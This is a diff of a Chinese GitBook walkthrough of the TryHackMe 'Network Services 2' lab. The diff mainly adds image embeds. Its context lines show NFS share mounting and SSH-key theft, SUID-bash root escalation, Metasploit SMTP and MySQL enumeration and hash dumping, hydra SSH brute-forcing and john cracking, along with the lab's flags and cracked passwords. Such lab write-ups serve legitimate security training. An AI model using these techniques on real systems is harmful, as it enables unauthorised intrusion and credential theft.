@@ -18,7 +18,7 @@ layout:
     visible: true
 ---
 
-# Network Services 2(网络服务2)
+# ☑️ Network Services 2(网络服务2)
 
 TryHackMe实验房间链接：[https://tryhackme.com/room/networkservices2](https://tryhackme.com/room/networkservices2)
 
@@ -65,7 +65,7 @@ NFS工作过程：
 
 阅读本小节内容，并回答以下问题。
 
-
+<figure><img src="../../.gitbook/assets/image-20230317194723712.png" alt=""><figcaption></figcaption></figure>
 
 ## 枚举NFS信息
 
@@ -115,23 +115,15 @@ tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 
 进行端口扫描：`nmap -A -p- -T4 10.10.20.187`
 
+<figure><img src="../../.gitbook/assets/image-20230317213827410.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317213806874.png" alt=""><figcaption></figcaption></figure>
 
 > 目标机开放了 7 个端口；NFS服务对应的端口号为 2049 。
 
 列出NFS共享：`/usr/sbin/showmount -e 10.10.20.187`
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317204457108.png" alt=""><figcaption></figcaption></figure>
 
 > 找到的NFS共享名称为：/home
 
@@ -148,9 +140,7 @@ cd .ssh
 ls
 ```
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317205136127.png" alt=""><figcaption></figcaption></figure>
 
 > NFS共享中的文件夹名称为：cappucino
 >
@@ -169,21 +159,13 @@ chmod 600 id_rsa
 ssh -i id_rsa cappucino@10.10.20.187
 ```
 
+<figure><img src="../../.gitbook/assets/image-20230317205343119.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317205442086.png" alt=""><figcaption></figcaption></figure>
 
 > 成功通过SSH登录到目标机器
 
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317205720915.png" alt=""><figcaption></figcaption></figure>
 
 ## 利用NFS服务
 
@@ -243,13 +225,9 @@ ls -la
 ./bash -p
 ```
 
+<figure><img src="../../.gitbook/assets/image-20230317223629633.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317223800902.png" alt=""><figcaption></figcaption></figure>
 
 > 我们使用什么字母配合chmod命令来设置SUID 位：s
 >
@@ -257,21 +235,11 @@ ls -la
 
 使用root shell查看目标文本文件内容：
 
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317223829520.png" alt=""><figcaption></figcaption></figure>
 
 > root.txt内容为：THM{nfs\_got\_pwned} 。
 
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317224231235.png" alt=""><figcaption></figcaption></figure>
 
 ## SMTP服务简介
 
@@ -299,9 +267,7 @@ POP（邮局协议-Post Office Protocol）和 IMAP（因特网消息访问协议
 
 我们可以将电子邮件从你的本地计算机到收件人的旅程映射如下：
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317000333197.png" alt=""><figcaption></figcaption></figure>
 
 1. 邮件用户代理，它可以是你的电子邮件客户端或者其他外部程序，它会连接到你的域中的SMTP服务器，例如 smtp.google.com，这将启动 SMTP 握手，此连接通过 SMTP 端口（通常为25号端口）进行工作，一旦建立并验证了这些连接，SMTP 会话就会启动。
 2. 现在可以开始发送邮件了，客户端首先会将 发件人和收件人的电子邮件地址以及电子邮件正文和其他任何附件 一同提交给服务器。
@@ -328,7 +294,7 @@ POP（邮局协议-Post Office Protocol）和 IMAP（因特网消息访问协议
 
 阅读本小节内容，并回答以下问题。
 
-
+<figure><img src="../../.gitbook/assets/image-20230317232141404.png" alt=""><figcaption></figcaption></figure>
 
 ## 枚举SMTP信息
 
@@ -348,15 +314,11 @@ tips：
 
 若目标服务器未禁用某些特殊SMTP命令，则可以利用这些特殊SMTP命令枚举用户，主要是MAIL FROM、RCPT TO、ETRN、VRFY指令。
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318110656120.png" alt=""><figcaption></figcaption></figure>
 
 执行上面的SMTP命令，通过相应的返回码状态可以判断用户是否存在，主要是250状态和550状态。
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318110722225.png" alt=""><figcaption></figcaption></figure>
 
 手动枚举用户名
 
@@ -508,9 +470,7 @@ Target domain ............
 
 **SMTP返回码**
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318112423985.png" alt=""><figcaption></figcaption></figure>
 
 **参考**
 
@@ -528,15 +488,11 @@ tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 nmap -A -p- -T4 10.10.181.4
 ```
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318170100685.png" alt=""><figcaption></figcaption></figure>
 
 > 目标ip开放了两个端口，一个是22/SSH服务，一个是25/SMTP服务
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318114942232.png" alt=""><figcaption></figcaption></figure>
 
 启动msf --> 搜索smtp版本检测模块 --> 选择该模块并列出模块相关的参数选项 --> 完成参数设置并最终执行该模块。
 
@@ -549,11 +505,9 @@ set RHOSTS 10.10.181.4     #此处ip为目标机ip
 run                        #执行该msf模块
 ```
 
+<figure><img src="../../.gitbook/assets/image-20230318163727152.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318163933552.png" alt=""><figcaption></figcaption></figure>
 
 > 要使用的完整模块名称是：auxiliary/scanner/smtp/smtp\_version
 >
@@ -561,19 +515,11 @@ run                        #执行该msf模块
 >
 > 目标机器使用的邮件传输代理是： Postfix
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318115054996.png" alt=""><figcaption></figcaption></figure>
 
 关于邮件传输代理：
 
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230317234301486.png" alt=""><figcaption></figcaption></figure>
 
 继续使用msf搜索SMTP用户枚举模块，然后选择使用该模块、查看模块选项、设置模块参数，最后执行该模块：
 
@@ -587,25 +533,15 @@ set RHOSTS 10.10.181.4  #此处ip为目标机器ip
 run
 ```
 
+<figure><img src="../../.gitbook/assets/image-20230318164215962.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318164243335.png" alt=""><figcaption></figcaption></figure>
 
 > 要使用的完整模块名称是：auxiliary/scanner/smtp/smtp\_enum
 >
 > 最终找到一个用户，用户名称为：administrator
 
-
-
-
-
-
-
-
-
-##
+<figure><img src="../../.gitbook/assets/image-20230318115344624.png" alt=""><figcaption></figcaption></figure>
 
 ## 利用SMTP服务
 
@@ -649,11 +585,9 @@ tips：基于上一小节的实验环境进一步操作。
 hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.181.4 ssh
 ```
 
+<figure><img src="../../.gitbook/assets/image-20230318164439933.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318164534522.png" alt=""><figcaption></figcaption></figure>
 
 > administrator用户的ssh登录密码为：alejandro
 
@@ -666,17 +600,11 @@ ls
 cat smtp.txt
 ```
 
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318164659543.png" alt=""><figcaption></figcaption></figure>
 
 > 目标文本文件的内容为：THM{who\_knew\_email\_servers\_were\_c00l?} 。
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318115933330.png" alt=""><figcaption></figcaption></figure>
 
 ## MySQL服务简介
 
@@ -727,7 +655,7 @@ MySQL可以运行在各种平台上，无论是Linux还是windows，它通常可
 
 阅读本小节内容，并回答以下问题。
 
-
+<figure><img src="../../.gitbook/assets/image-20230318000034348.png" alt=""><figcaption></figcaption></figure>
 
 ## 枚举MySQL信息
 
@@ -762,7 +690,7 @@ tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 sudo apt install default-mysql-client
 ```
 
-
+<figure><img src="../../.gitbook/assets/image-20230318170717498.png" alt=""><figcaption></figcaption></figure>
 
 验证已提供的登录凭据（root：password）是否可连接到目标的MySQL数据库服务：
 
@@ -772,9 +700,7 @@ mysql -h 10.10.63.194 -u root -p
 #输入密码：password
 ```
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318171107085.png" alt=""><figcaption></figcaption></figure>
 
 针对目标机进行端口扫描：
 
@@ -782,9 +708,7 @@ mysql -h 10.10.63.194 -u root -p
 nmap -A -p- -T4 10.10.63.194
 ```
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318173157060.png" alt=""><figcaption></figcaption></figure>
 
 > 扫描到目标机开放了两个端口：22/ssh、3306/mysql
 
@@ -801,13 +725,9 @@ set USERNAME root
 run
 ```
 
+<figure><img src="../../.gitbook/assets/image-20230318171240395.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318171530544.png" alt=""><figcaption></figcaption></figure>
 
 > 查询语句 select version() 的返回结果为：5.7.29-0ubuntu0.18.04.1
 
@@ -819,25 +739,11 @@ set SQL show databases
 run
 ```
 
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318171841525.png" alt=""><figcaption></figcaption></figure>
 
 > 目标MySQL服务器中共有四个数据库
 
-
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318161928709.png" alt=""><figcaption></figcaption></figure>
 
 ## 利用MySQL服务
 
@@ -885,15 +791,11 @@ set USERNAME root
 run
 ```
 
+<figure><img src="../../.gitbook/assets/image-20230318172417960.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/image-20230318172529303.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318172735807.png" alt=""><figcaption></figcaption></figure>
 
 > 此处所选择的模块的完整名称为：auxiliary/scanner/mysql/mysql\_schemadump
 >
@@ -911,15 +813,7 @@ set USERNAME root
 run
 ```
 
-
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318173503606.png" alt=""><figcaption></figcaption></figure>
 
 > 此处选择的模块的完整名称为：auxiliary/scanner/mysql/mysql\_hashdump
 >
@@ -927,15 +821,11 @@ run
 
 退出msf，我们将上图中的最后一条记录保存到本地机新建的hash.txt文件中：`echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt`
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318173756260.png" alt=""><figcaption></figcaption></figure>
 
 使用john进行hash破解（此处使用最简单的john语法即可）：`john hash.txt`
 
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318173815153.png" alt=""><figcaption></figcaption></figure>
 
 > 破解hash得到的密码为：doggie
 
@@ -948,15 +838,11 @@ ls
 cat MySQL.txt
 ```
 
-
+<figure><img src="../../.gitbook/assets/image-20230318173957515.png" alt=""><figcaption></figcaption></figure>
 
 > 目标文本文件的内容为：THM{congratulations\_you\_got\_the\_mySQL\_flag} 。
 
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image-20230318162157958.png" alt=""><figcaption></figcaption></figure>
 
 ## 知识拓展
 
